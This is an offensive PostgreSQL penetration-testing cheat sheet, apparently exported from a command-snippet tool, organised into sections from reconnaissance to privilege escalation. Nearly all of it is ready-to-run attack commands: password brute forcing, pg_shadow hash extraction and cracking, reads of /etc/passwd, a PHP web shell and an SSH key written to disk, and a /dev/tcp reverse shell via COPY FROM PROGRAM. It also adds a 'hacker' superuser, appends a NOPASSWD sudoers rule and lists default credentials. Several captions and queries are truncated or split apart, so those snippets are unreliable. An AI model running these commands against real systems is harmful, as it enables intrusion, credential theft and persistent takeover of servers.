---
id: "dij9te2nfmptlc1di"
title: "postgresql"
description: ""
tags: []
order: "16"
createdAt: "2026-05-31T09:42:01.206Z"
updatedAt: "2026-05-31T09:56:29.452Z"
---

## Reconnaissance
<!-- section: {"id":"p38mqoi0ymptlukko","order":0,"collapsed":false} -->

### ocieghfm9mptluknc
```bash
nmap -sV -sC -p 5432 $TARGET
```

_Reconnaissance Scan for PostgreSQL default port._

**Tags:** postgresql, recon, nmap, rustscan
<!-- cmd: {"id":"ocieghfm9mptluknc","language":"bash","sectionId":"p38mqoi0ymptlukko","tags":["postgresql","recon","nmap","rustscan"]} -->

### ivemwrc5mmptluknj
```bash
rustscan -a $TARGET -p 5432 -- -sV -sC
```

**Tags:** postgresql, recon, nmap, rustscan
<!-- cmd: {"id":"ivemwrc5mmptluknj","language":"bash","sectionId":"p38mqoi0ymptlukko","tags":["postgresql","recon","nmap","rustscan"]} -->

### s9a5w99k1mptluknn
```bash
nmap -p 5432 --script=pgsql-brute $TARGET
```

**Tags:** postgresql, recon, nmap, rustscan
<!-- cmd: {"id":"s9a5w99k1mptluknn","language":"bash","sectionId":"p38mqoi0ymptlukko","tags":["postgresql","recon","nmap","rustscan"]} -->

## Brute Force
<!-- section: {"id":"eou53gpdjmptlukkx","order":1,"collapsed":false} -->

### a69l34tkwmptluko4
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt $TARGET postgres
```

_Brute Force_

**Tags:** postgresql, bruteforce, hydra, medusa
<!-- cmd: {"id":"a69l34tkwmptluko4","language":"bash","sectionId":"eou53gpdjmptlukkx","tags":["postgresql","bruteforce","hydra","medusa"]} -->

### w962jgu5cmptluko9
```bash
nmap -p 5432 --script pgsql-brute --script-args userdb=users.txt,passdb=rockyou.txt $TARGET
```

**Tags:** postgresql, bruteforce, hydra, medusa
<!-- cmd: {"id":"w962jgu5cmptluko9","language":"bash","sectionId":"eou53gpdjmptlukkx","tags":["postgresql","bruteforce","hydra","medusa"]} -->

### c057tp1wfmptlukod
```bash
medusa -h $TARGET -U users.txt -P rockyou.txt -M postgres
```

**Tags:** postgresql, bruteforce, hydra, medusa
<!-- cmd: {"id":"c057tp1wfmptlukod","language":"bash","sectionId":"eou53gpdjmptlukkx","tags":["postgresql","bruteforce","hydra","medusa"]} -->

### c13ae4sfcmptlukoj
```bash
netexec ssh $TARGET -u users.txt -p rockyou.txt --no-brute-unless-found
```

**Tags:** postgresql, bruteforce, hydra, medusa
<!-- cmd: {"id":"c13ae4sfcmptlukoj","language":"bash","sectionId":"eou53gpdjmptlukkx","tags":["postgresql","bruteforce","hydra","medusa"]} -->

## Authentication
<!-- section: {"id":"gze5e5ciamptlukl3","order":2,"collapsed":false} -->

### f6k793ckjmptlukox
```bash
psql -h $TARGET -U $USER -d postgres
```

_Authentication Connect to PostgreSQL._

**Tags:** postgresql, authentication, login
<!-- cmd: {"id":"f6k793ckjmptlukox","language":"bash","sectionId":"gze5e5ciamptlukl3","tags":["postgresql","authentication","login"]} -->

### qqmhloxlomptlukp3
```bash
psql -h $TARGET -U $USER -d $DATABASE -W
```

**Tags:** postgresql, authentication, login
<!-- cmd: {"id":"qqmhloxlomptlukp3","language":"bash","sectionId":"gze5e5ciamptlukl3","tags":["postgresql","authentication","login"]} -->

### obzk838v4mptlukp9
```bash
PGPASSWORD=$PASS psql -h $TARGET -U $USER -d postgres -c "SELECT version();"
```

**Tags:** postgresql, authentication, login
<!-- cmd: {"id":"obzk838v4mptlukp9","language":"bash","sectionId":"gze5e5ciamptlukl3","tags":["postgresql","authentication","login"]} -->

### eo0eobghjmptlukpd
```bash
psql "postgresql://$USER:$PASS@$TARGET:5432/postgres"
```

**Tags:** postgresql, authentication, login
<!-- cmd: {"id":"eo0eobghjmptlukpd","language":"bash","sectionId":"gze5e5ciamptlukl3","tags":["postgresql","authentication","login"]} -->

## Enumeration (Authenticated)
<!-- section: {"id":"lo09cyor8mptlukl7","order":3,"collapsed":false} -->

### to2xqowx9mptlukpr
```bash
SELECT version();
```

_Enumeration (Authenticated)_

**Tags:** postgresql, enumeration, authenticated
<!-- cmd: {"id":"to2xqowx9mptlukpr","language":"bash","sectionId":"lo09cyor8mptlukl7","tags":["postgresql","enumeration","authenticated"]} -->

### pjq5b1bd4mptlukpx
```bash
SELECT current_user, session_user;
```

_user, session_

**Tags:** postgresql, enumeration, authenticated
<!-- cmd: {"id":"pjq5b1bd4mptlukpx","language":"bash","sectionId":"lo09cyor8mptlukl7","tags":["postgresql","enumeration","authenticated"]} -->

### audztdoo3mptlukq2
```bash
SELECT rolname, rolsuper, rolcreaterole, rolcreatedb FROM pg_roles;
```

**Tags:** postgresql, enumeration, authenticated
<!-- cmd: {"id":"audztdoo3mptlukq2","language":"bash","sectionId":"lo09cyor8mptlukl7","tags":["postgresql","enumeration","authenticated"]} -->

### 6ewbgh4bzmptlukq7
```bash
\l
```

**Tags:** postgresql, enumeration, authenticated
<!-- cmd: {"id":"6ewbgh4bzmptlukq7","language":"bash","sectionId":"lo09cyor8mptlukl7","tags":["postgresql","enumeration","authenticated"]} -->

### hz4u4h376mptlukqc
```bash
SELECT datname FROM pg_database;
```

**Tags:** postgresql, enumeration, authenticated
<!-- cmd: {"id":"hz4u4h376mptlukqc","language":"bash","sectionId":"lo09cyor8mptlukl7","tags":["postgresql","enumeration","authenticated"]} -->

### kwniwdo17mptlukqg
```bash
\dn
```

**Tags:** postgresql, enumeration, authenticated
<!-- cmd: {"id":"kwniwdo17mptlukqg","language":"bash","sectionId":"lo09cyor8mptlukl7","tags":["postgresql","enumeration","authenticated"]} -->

### 17bf6qahcmptlukql
```bash
SELECT schema_name FROM information_schema.schemata;
```

_name FROM information_

**Tags:** postgresql, enumeration, authenticated
<!-- cmd: {"id":"17bf6qahcmptlukql","language":"bash","sectionId":"lo09cyor8mptlukl7","tags":["postgresql","enumeration","authenticated"]} -->

### tfd47ln6ymptlukqq
```bash
\dt *.*
```

**Tags:** postgresql, enumeration, authenticated
<!-- cmd: {"id":"tfd47ln6ymptlukqq","language":"bash","sectionId":"lo09cyor8mptlukl7","tags":["postgresql","enumeration","authenticated"]} -->

### p3d102o1xmptlukqv
```bash
SELECT table_schema, table_name FROM information_schema.tables WHERE table_type='BASE TABLE';
```

_schema, table_

**Tags:** postgresql, enumeration, authenticated
<!-- cmd: {"id":"p3d102o1xmptlukqv","language":"bash","sectionId":"lo09cyor8mptlukl7","tags":["postgresql","enumeration","authenticated"]} -->

### 7qvptvxdzmptlukr1
```bash
SELECT usename, passwd FROM pg_shadow;
```

**Tags:** postgresql, enumeration, authenticated
<!-- cmd: {"id":"7qvptvxdzmptlukr1","language":"bash","sectionId":"lo09cyor8mptlukl7","tags":["postgresql","enumeration","authenticated"]} -->

### 5r25myg50mptlukr5
```bash
SELECT usesuper FROM pg_user WHERE usename=current_user;
```

_user WHERE usename=current_

**Tags:** postgresql, enumeration, authenticated
<!-- cmd: {"id":"5r25myg50mptlukr5","language":"bash","sectionId":"lo09cyor8mptlukl7","tags":["postgresql","enumeration","authenticated"]} -->

### wr6j59vvkmptlukra
```bash
SELECT * FROM pg_extension;
```

**Tags:** postgresql, enumeration, authenticated
<!-- cmd: {"id":"wr6j59vvkmptlukra","language":"bash","sectionId":"lo09cyor8mptlukl7","tags":["postgresql","enumeration","authenticated"]} -->

### ujamx0e9bmptlukrf
```bash
SHOW hba_file;
```

**Tags:** postgresql, enumeration, authenticated
<!-- cmd: {"id":"ujamx0e9bmptlukrf","language":"bash","sectionId":"lo09cyor8mptlukl7","tags":["postgresql","enumeration","authenticated"]} -->

### dnn8ohjt1mptlukrj
```bash
SHOW config_file;
```

**Tags:** postgresql, enumeration, authenticated
<!-- cmd: {"id":"dnn8ohjt1mptlukrj","language":"bash","sectionId":"lo09cyor8mptlukl7","tags":["postgresql","enumeration","authenticated"]} -->

### 8woten5fymptlukro
```bash
SHOW data_directory;
```

**Tags:** postgresql, enumeration, authenticated
<!-- cmd: {"id":"8woten5fymptlukro","language":"bash","sectionId":"lo09cyor8mptlukl7","tags":["postgresql","enumeration","authenticated"]} -->

## Data Extraction
<!-- section: {"id":"as0v4jn54mptlukld","order":4,"collapsed":false} -->

### pwj7uunz0mptluks4
```bash
SELECT table_schema, table_name, column_name FROM information_schema.columns
```

_schema, table_

**Tags:** postgresql, datadump, exfiltration
<!-- cmd: {"id":"pwj7uunz0mptluks4","language":"bash","sectionId":"as0v4jn54mptlukld","tags":["postgresql","datadump","exfiltration"]} -->

### o6upomdq9mptluks9
```bash
WHERE column_name ILIKE '%pass%' OR column_name ILIKE '%secret%' OR column_name ILIKE '%token%' OR column_name ILIKE '%key%';
```

_name ILIKE '%pass%' OR column_

**Tags:** postgresql, datadump, exfiltration
<!-- cmd: {"id":"o6upomdq9mptluks9","language":"bash","sectionId":"as0v4jn54mptlukld","tags":["postgresql","datadump","exfiltration"]} -->

### qbwdhc5v8mptlukse
```bash
SELECT * FROM $TABLE LIMIT 100;
```

**Tags:** postgresql, datadump, exfiltration
<!-- cmd: {"id":"qbwdhc5v8mptlukse","language":"bash","sectionId":"as0v4jn54mptlukld","tags":["postgresql","datadump","exfiltration"]} -->

### enyougkizmptluksk
```bash
COPY $TABLE TO '/tmp/dump.csv' CSV HEADER;
```

**Tags:** postgresql, datadump, exfiltration
<!-- cmd: {"id":"enyougkizmptluksk","language":"bash","sectionId":"as0v4jn54mptlukld","tags":["postgresql","datadump","exfiltration"]} -->

### 26oyoogximptluksp
```bash
PGPASSWORD=$PASS pg_dump -h $TARGET -U $USER -d $DATABASE > dump.sql
```

**Tags:** postgresql, datadump, exfiltration
<!-- cmd: {"id":"26oyoogximptluksp","language":"bash","sectionId":"as0v4jn54mptlukld","tags":["postgresql","datadump","exfiltration"]} -->

### 8o59o56hdmptluksu
```bash
PGPASSWORD=$PASS pg_dumpall -h $TARGET -U $USER > all_dbs.sql
```

_dumpall -h $TARGET -U $USER > all_

**Tags:** postgresql, datadump, exfiltration
<!-- cmd: {"id":"8o59o56hdmptluksu","language":"bash","sectionId":"as0v4jn54mptlukld","tags":["postgresql","datadump","exfiltration"]} -->

## File Read
<!-- section: {"id":"ypxv3bdd4mptluklh","order":5,"collapsed":false} -->

### ebw30w61amptlukt4
```bash
CREATE TABLE tmp_read(data text);
```

_File Read_

**Tags:** postgresql, fileread, lfi
<!-- cmd: {"id":"ebw30w61amptlukt4","language":"bash","sectionId":"ypxv3bdd4mptluklh","tags":["postgresql","fileread","lfi"]} -->

### 3lcmcqcqrmptlukt9
```bash
COPY tmp_read FROM '/etc/passwd';
```

**Tags:** postgresql, fileread, lfi
<!-- cmd: {"id":"3lcmcqcqrmptlukt9","language":"bash","sectionId":"ypxv3bdd4mptluklh","tags":["postgresql","fileread","lfi"]} -->

### 1a88oeav2mptluktd
```bash
SELECT * FROM tmp_read;
```

**Tags:** postgresql, fileread, lfi
<!-- cmd: {"id":"1a88oeav2mptluktd","language":"bash","sectionId":"ypxv3bdd4mptluklh","tags":["postgresql","fileread","lfi"]} -->

### dkss9hu5pmptlukti
```bash
DROP TABLE tmp_read;
```

**Tags:** postgresql, fileread, lfi
<!-- cmd: {"id":"dkss9hu5pmptlukti","language":"bash","sectionId":"ypxv3bdd4mptluklh","tags":["postgresql","fileread","lfi"]} -->

### yyyzjn3sxmptluktm
```bash
SELECT pg_read_file('/etc/passwd');
```

_read_

**Tags:** postgresql, fileread, lfi
<!-- cmd: {"id":"yyyzjn3sxmptluktm","language":"bash","sectionId":"ypxv3bdd4mptluklh","tags":["postgresql","fileread","lfi"]} -->

### qr824sdb8mptluktr
```bash
SELECT pg_read_file('/etc/postgresql/14/main/pg_hba.conf');
```

_read_

**Tags:** postgresql, fileread, lfi
<!-- cmd: {"id":"qr824sdb8mptluktr","language":"bash","sectionId":"ypxv3bdd4mptluklh","tags":["postgresql","fileread","lfi"]} -->

## File Write
<!-- section: {"id":"wij4jv2yfmptluklm","order":6,"collapsed":false} -->

### x2zk4a99smptlukub
```bash
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
```

_File Write_

**Tags:** postgresql, filewrite, webshell, rce
<!-- cmd: {"id":"x2zk4a99smptlukub","language":"bash","sectionId":"wij4jv2yfmptluklm","tags":["postgresql","filewrite","webshell","rce"]} -->

### l3g6kwwsomptlukug
```bash
COPY (SELECT 'ssh-rsa AAAA...') TO '/var/lib/postgresql/.ssh/authorized_keys';
```

**Tags:** postgresql, filewrite, webshell, rce
<!-- cmd: {"id":"l3g6kwwsomptlukug","language":"bash","sectionId":"wij4jv2yfmptluklm","tags":["postgresql","filewrite","webshell","rce"]} -->

## RCE via COPY TO/FROM PROGRAM (PostgreSQL 9.3+)
<!-- section: {"id":"ryqw0ruxrmptluklr","order":7,"collapsed":false} -->

### iq7b0a3r1mptlukus
```bash
COPY cmd_exec (output) FROM PROGRAM 'id';
```

_RCE via COPY TO/FROM PROGRAM (PostgreSQL 9.3+) Execute OS commands via COPY command._

**Tags:** postgresql, rce, exploitation, reverseShell
<!-- cmd: {"id":"iq7b0a3r1mptlukus","language":"bash","sectionId":"ryqw0ruxrmptluklr","tags":["postgresql","rce","exploitation","reverseShell"]} -->

### kkmys3a5nmptlukux
```bash
SELECT * FROM cmd_exec;
```

**Tags:** postgresql, rce, exploitation, reverseShell
<!-- cmd: {"id":"kkmys3a5nmptlukux","language":"bash","sectionId":"ryqw0ruxrmptluklr","tags":["postgresql","rce","exploitation","reverseShell"]} -->

### nbia9hup7mptlukv2
```bash
CREATE TABLE cmd_exec(output text);
```

**Tags:** postgresql, rce, exploitation, reverseShell
<!-- cmd: {"id":"nbia9hup7mptlukv2","language":"bash","sectionId":"ryqw0ruxrmptluklr","tags":["postgresql","rce","exploitation","reverseShell"]} -->

### yv0jsf7t0mptlukv7
```bash
COPY cmd_exec FROM PROGRAM 'id';
```

**Tags:** postgresql, rce, exploitation, reverseShell
<!-- cmd: {"id":"yv0jsf7t0mptlukv7","language":"bash","sectionId":"ryqw0ruxrmptluklr","tags":["postgresql","rce","exploitation","reverseShell"]} -->

### hbe3k53hgmptlukvb
```bash
SELECT * FROM cmd_exec;
```

**Tags:** postgresql, rce, exploitation, reverseShell
<!-- cmd: {"id":"hbe3k53hgmptlukvb","language":"bash","sectionId":"ryqw0ruxrmptluklr","tags":["postgresql","rce","exploitation","reverseShell"]} -->

### 2cghex892mptlukvg
```bash
COPY cmd_exec FROM PROGRAM 'bash -c ''bash -i >& /dev/tcp/$LHOST/4444 0>&1''';
```

**Tags:** postgresql, rce, exploitation, reverseShell
<!-- cmd: {"id":"2cghex892mptlukvg","language":"bash","sectionId":"ryqw0ruxrmptluklr","tags":["postgresql","rce","exploitation","reverseShell"]} -->

### stt40ytzgmptlukvl
```bash
CREATE TABLE s(x text); COPY s FROM PROGRAM 'bash -c ''bash -i >& /dev/tcp/$LHOST/4444 0>&1''';
```

**Tags:** postgresql, rce, exploitation, reverseShell
<!-- cmd: {"id":"stt40ytzgmptlukvl","language":"bash","sectionId":"ryqw0ruxrmptluklr","tags":["postgresql","rce","exploitation","reverseShell"]} -->

## RCE via Custom Extension (UDF)
<!-- section: {"id":"3jdwids50mptluklv","order":8,"collapsed":false} -->

### f6wau1m1cmptlukvu
```bash
CREATE OR REPLACE FUNCTION sys_exec(text) RETURNS int AS '/tmp/pg_exec.so', 'sys_exec' LANGUAGE C STRICT;
```

_exec(text) RETURNS int AS '/tmp/pg_

**Tags:** postgresql, udf, rce, privesc
<!-- cmd: {"id":"f6wau1m1cmptlukvu","language":"bash","sectionId":"3jdwids50mptluklv","tags":["postgresql","udf","rce","privesc"]} -->

### sk99bznk9mptlukvz
```bash
SELECT sys_exec('id > /tmp/pwned');
```

**Tags:** postgresql, udf, rce, privesc
<!-- cmd: {"id":"sk99bznk9mptlukvz","language":"bash","sectionId":"3jdwids50mptluklv","tags":["postgresql","udf","rce","privesc"]} -->

## SQL Injection via sqlmap
<!-- section: {"id":"ewhow3wl6mptlukm1","order":9,"collapsed":false} -->

### cgsg6rqcamptlukwh
```bash
sqlmap -u "$URL?id=1" --dbms=postgresql --dbs --batch
```

_SQL Injection via sqlmap_

**Tags:** postgresql, sqli, sqlmap
<!-- cmd: {"id":"cgsg6rqcamptlukwh","language":"bash","sectionId":"ewhow3wl6mptlukm1","tags":["postgresql","sqli","sqlmap"]} -->

### 1i3hu7uf9mptlukwm
```bash
sqlmap -u "$URL?id=1" --dbms=postgresql --os-shell --batch
```

**Tags:** postgresql, sqli, sqlmap
<!-- cmd: {"id":"1i3hu7uf9mptlukwm","language":"bash","sectionId":"ewhow3wl6mptlukm1","tags":["postgresql","sqli","sqlmap"]} -->

### uce26bhy1mptlukwr
```bash
sqlmap -u "$URL" --data="user=admin&pass=test" --dbms=postgresql --dump --batch
```

**Tags:** postgresql, sqli, sqlmap
<!-- cmd: {"id":"uce26bhy1mptlukwr","language":"bash","sectionId":"ewhow3wl6mptlukm1","tags":["postgresql","sqli","sqlmap"]} -->

## Privilege Escalation (ALTER ROLE)
<!-- section: {"id":"cjc1wv06omptlukm6","order":10,"collapsed":false} -->

### qi1pzb1aemptlukx1
```bash
ALTER ROLE $USER SUPERUSER;
```

_Privilege Escalation (ALTER ROLE)_

**Tags:** postgresql, privesc, superuser
<!-- cmd: {"id":"qi1pzb1aemptlukx1","language":"bash","sectionId":"cjc1wv06omptlukm6","tags":["postgresql","privesc","superuser"]} -->

### v64xnindwmptlukx6
```bash
CREATE ROLE hacker LOGIN SUPERUSER PASSWORD 'hacker';
```

**Tags:** postgresql, privesc, superuser
<!-- cmd: {"id":"v64xnindwmptlukx6","language":"bash","sectionId":"cjc1wv06omptlukm6","tags":["postgresql","privesc","superuser"]} -->

### 9nsqsfi91mptlukxb
```bash
COPY cmd_exec FROM PROGRAM 'echo "postgres ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers';
```

**Tags:** postgresql, privesc, superuser
<!-- cmd: {"id":"9nsqsfi91mptlukxb","language":"bash","sectionId":"cjc1wv06omptlukm6","tags":["postgresql","privesc","superuser"]} -->

## Common Misconfigurations
<!-- section: {"id":"hrpqc45gamptlukmb","order":11,"collapsed":false} -->

### d1lwzful1mptlukxk
```bash
grep "trust" /etc/postgresql/*/main/pg_hba.conf
```

_Common Misconfigurations_

**Tags:** postgresql, misconfiguration, hardening
<!-- cmd: {"id":"d1lwzful1mptlukxk","language":"bash","sectionId":"hrpqc45gamptlukmb","tags":["postgresql","misconfiguration","hardening"]} -->

### 2dwkkusqemptlukxp
```bash
grep listen_addresses /etc/postgresql/*/main/postgresql.conf
```

**Tags:** postgresql, misconfiguration, hardening
<!-- cmd: {"id":"2dwkkusqemptlukxp","language":"bash","sectionId":"hrpqc45gamptlukmb","tags":["postgresql","misconfiguration","hardening"]} -->

### 1fu4tpj7jmptlukxu
```bash
psql -h $TARGET -U postgres -c "SELECT 1;" 2>/dev/null && echo "OPEN"
```

**Tags:** postgresql, misconfiguration, hardening
<!-- cmd: {"id":"1fu4tpj7jmptlukxu","language":"bash","sectionId":"hrpqc45gamptlukmb","tags":["postgresql","misconfiguration","hardening"]} -->

### ratsy7epomptlukxy
```bash
ls -la /var/lib/postgresql/
```

**Tags:** postgresql, misconfiguration, hardening
<!-- cmd: {"id":"ratsy7epomptlukxy","language":"bash","sectionId":"hrpqc45gamptlukmb","tags":["postgresql","misconfiguration","hardening"]} -->

## Hash Extraction & Cracking
<!-- section: {"id":"7xsxd8l63mptlukmf","order":12,"collapsed":false} -->

### cgncugqdbmptluky8
```bash
SELECT usename, passwd FROM pg_shadow;
```

_Hash Extraction & Cracking_

**Tags:** postgresql, hashcracking, hashcat, credentials
<!-- cmd: {"id":"cgncugqdbmptluky8","language":"bash","sectionId":"7xsxd8l63mptlukmf","tags":["postgresql","hashcracking","hashcat","credentials"]} -->

### 6ure1ctuamptlukyc
```bash
hashcat -m 11100 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Tags:** postgresql, hashcracking, hashcat, credentials
<!-- cmd: {"id":"6ure1ctuamptlukyc","language":"bash","sectionId":"7xsxd8l63mptlukmf","tags":["postgresql","hashcracking","hashcat","credentials"]} -->

### 6kjzrxw4pmptlukyh
```bash
echo -n "passwordusername" | md5sum
```

**Tags:** postgresql, hashcracking, hashcat, credentials
<!-- cmd: {"id":"6kjzrxw4pmptlukyh","language":"bash","sectionId":"7xsxd8l63mptlukmf","tags":["postgresql","hashcracking","hashcat","credentials"]} -->

## Default Credentials
<!-- section: {"id":"z2ufp8dc2mptlukmk","order":13,"collapsed":false} -->

### wuowv9v04mptlukze
```bash
postgres : postgres
```

_Default Credentials_

**Tags:** postgresql, default-credentials
<!-- cmd: {"id":"wuowv9v04mptlukze","language":"bash","sectionId":"z2ufp8dc2mptlukmk","tags":["postgresql","default-credentials"]} -->

### o3jeet9b2mptlukzk
```bash
postgres : (empty)
```

**Tags:** postgresql, default-credentials
<!-- cmd: {"id":"o3jeet9b2mptlukzk","language":"bash","sectionId":"z2ufp8dc2mptlukmk","tags":["postgresql","default-credentials"]} -->

### a9qzketktmptlukzq
```bash
postgres : password
```

**Tags:** postgresql, default-credentials
<!-- cmd: {"id":"a9qzketktmptlukzq","language":"bash","sectionId":"z2ufp8dc2mptlukmk","tags":["postgresql","default-credentials"]} -->

### 751mfptbkmptlukzu
```bash
postgres : admin
```

**Tags:** postgresql, default-credentials
<!-- cmd: {"id":"751mfptbkmptlukzu","language":"bash","sectionId":"z2ufp8dc2mptlukmk","tags":["postgresql","default-credentials"]} -->

### djupj6yiamptlukzz
```bash
admin    : admin
```

**Tags:** postgresql, default-credentials
<!-- cmd: {"id":"djupj6yiamptlukzz","language":"bash","sectionId":"z2ufp8dc2mptlukmk","tags":["postgresql","default-credentials"]} -->
